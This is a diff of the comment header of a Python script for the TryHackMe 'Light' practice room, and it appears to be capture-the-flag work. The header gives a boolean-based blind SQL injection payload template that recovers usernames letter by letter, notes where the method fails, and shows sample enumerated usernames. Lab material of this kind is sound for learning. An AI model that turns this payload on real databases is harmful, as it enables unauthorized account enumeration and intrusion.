@@ -1,14 +1,25 @@
 # this script enumerates the usernames of the TryHackMe Light room database
 # there are other, and much better, ways to bypass the SQL security in that room, but the assumption here is:
-#   - you only get a boolean response for a query
-#   - try to find all usernames based on this
+#   - you only get a boolean response for each query
 
 # the payload:
 #   ' OR (substr(username,{letter_position},1)='{letter}') and '1'='1"
 # this will return a successful response when it matches the correct letter in the correct place for a username
 # for example:
 #   - for "smokey" it will return successfully for "m" in the 2nd position
-#   - usernames will letter crashes, so only the higher priority username will get the letter appended, others are padded with "*"
+#   - for usernames with the same letter in the same position, only one will have priority, and the other is padded with "*"
+#   - if the last letter of a username loses priority to another username, it won't be recognized (see name "*tev" for user steve below)
+
+# example output
+#=== Usernames ===
+#Password: *************** -> Username: alice
+#Password: *************** -> Username: hazel
+#Password: *************** -> Username: j*hn
+#Password: *************** -> Username: michael
+#Password: *************** -> Username: rob
+#Password: *************** -> Username: smok*y
+#Password: *************** -> Username: *tev
+#Password: *************** -> Username: **lph
 
 import socket
 import sys
